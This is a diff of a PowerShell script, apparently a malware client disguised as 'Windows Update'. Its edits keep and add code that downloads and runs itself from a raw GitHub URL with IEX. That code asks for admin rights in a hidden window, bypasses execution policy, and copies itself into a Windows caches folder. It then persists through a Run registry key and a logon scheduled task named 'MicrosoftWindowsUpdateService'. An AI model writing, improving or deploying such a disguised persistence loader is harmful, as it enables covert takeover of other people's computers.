@@ -3,24 +3,20 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-if (-not $isAdmin) {
-    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
-    exit
-}
-
-$dir = "$env:ProgramData\Microsoft\Windows\Caches"
-$scriptPath = "$dir\$installName.ps1"
-$vbsPath = "$dir\$installName.vbs"
-
+# Se estiver na tela normal, esconde e re-executa invisível
 if ($args -notcontains "-silent") {
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+    if (-not $isAdmin) {
+        try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
+        exit
+    }
+
+    $dir = "$env:ProgramData\Microsoft\Windows\Caches"
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
-    try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
+    try { (New-Object Net.WebClient).DownloadFile($myUrl, "$dir\$installName.ps1") } catch {}
     
-    $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '"" -silent", 0, False'
-    Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
-    
-    $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
+    $argList = "-nop -w hidden -ep bypass -f `"$dir\$installName.ps1`" -silent"
+    $cmd = "powershell.exe $argList"
     
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
@@ -28,22 +24,21 @@ if ($args -notcontains "-silent") {
     } catch {}
 
     try {
-        $startup = [Environment]::GetFolderPath('Startup')
-        Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
-    } catch {}
-
-    try {
-        $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $argList
         $trigger1 = New-ScheduledTaskTrigger -AtLogOn
         $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0)
-        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1 -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
-    
-    attrib +h +s +r $scriptPath 2>$null
-    attrib +h +s +r $vbsPath 2>$null
-    
-    Start-Process wscript.exe -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
+
+    # Inicia escondido e sai
+    Start-Process powershell.exe -ArgumentList $argList -WindowStyle Hidden
+    exit
+}
+
+# MODO INVISÍVEL
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
     exit
 }
 
